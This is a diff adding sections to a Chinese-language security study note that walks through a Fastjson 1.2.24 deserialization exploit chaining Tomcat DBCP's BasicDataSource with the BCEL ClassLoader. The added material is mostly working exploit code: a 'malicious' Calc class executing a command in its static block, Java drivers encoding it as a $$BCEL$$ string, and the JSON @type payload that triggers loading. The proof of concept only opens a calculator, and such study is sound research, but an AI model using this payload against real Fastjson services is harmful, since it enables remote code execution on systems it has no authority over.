@@ -564,11 +564,20 @@ bcel简单分析：
 环境配置
 
 ```xml
-<dependency>
-      <groupId>commons-dbcp</groupId>
-      <artifactId>commons-dbcp</artifactId>
-      <version>1.4</version>
-</dependency>
+    <dependencies>
+        <dependency>
+            <groupId>com.alibaba</groupId>
+            <artifactId>fastjson</artifactId>
+            <version>1.2.24</version>
+        </dependency>
+
+        <dependency>
+            <groupId>org.apache.tomcat</groupId>
+            <artifactId>tomcat-dbcp</artifactId>
+            <version>9.0.20</version>
+        </dependency>
+
+    </dependencies>
 ```
 
 我们先从`org.apache.commons.dbcp.BasicDataSource`开始分析
@@ -593,10 +602,93 @@ bcel简单分析：
 
 那我们可以尝试一下
 
+Calc.java(恶意类)
+
+```java
+package org.example;
+
+import java.io.IOException;
+
+public class Calc {
+    static {
+        try {
+            Runtime.getRuntime().exec("calc");
+        } catch (IOException e){
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+FastjsonBCEL.java
+
+```java
+package org.example;
+
+
+import com.sun.org.apache.bcel.internal.Repository;
+import com.sun.org.apache.bcel.internal.classfile.JavaClass;
+import com.sun.org.apache.bcel.internal.classfile.Utility;
+import org.apache.commons.dbcp.BasicDataSource;
+import com.sun.org.apache.bcel.internal.util.ClassLoader;
+
+
+import java.io.IOException;
+import java.sql.SQLException;
+
+public class FastjsonBCEL {
+    public static void main(String[] args) throws SQLException, ClassNotFoundException, InstantiationException, IllegalAccessException, IOException {
+        
+        JavaClass cls = Repository.lookupClass(Calc.class);
+        String code = Utility.encode(cls.getBytes(), true);
+        System.out.println(code);
+        ClassLoader ClassLoader = new ClassLoader();
+        BasicDataSource basicDataSource = new BasicDataSource();
+        basicDataSource.setDriverClassName("$$BCEL$$"+code);
+
+        basicDataSource.setDriverClassLoader(ClassLoader);
+        basicDataSource.getConnection();
+
+
+    }
+}
+```
+
+> tips:
+>
+> 导入包不能导入错，比如其他包里面也有Repository类，但是没有lookupClass方法
+
+![image-20241112225220884](assets/image-20241112225220884.png)
+
+成功打开计算器
+
+接下来用尝试利用fastjson来执行
+
+```java
+package org.example;
+import com.alibaba.fastjson.JSON;
+import com.sun.org.apache.bcel.internal.Repository;
+import com.sun.org.apache.bcel.internal.classfile.JavaClass;
+import com.sun.org.apache.bcel.internal.classfile.Utility;
+import com.sun.org.apache.bcel.internal.util.ClassLoader;
+import java.io.IOException;
+import java.sql.SQLException;
+
+public class FastjsonBCEL {
+    public static void main(String[] args) throws SQLException, ClassNotFoundException, InstantiationException, IllegalAccessException, IOException {
+        JavaClass cls = Repository.lookupClass(Calc.class);
+        String code = Utility.encode(cls.getBytes(), true);
+        System.out.println(code);
+        String s = "{\"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassLoader\": {\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\": \"$$BCEL$$"+code+"\"}";
+        JSON.parseObject(s);
+    }
+}
+```
+
 payload:
 
 ```
-
+{\"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassLoader\": {\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\": \"$$BCEL$$"+code+"\"}
 ```
 
 
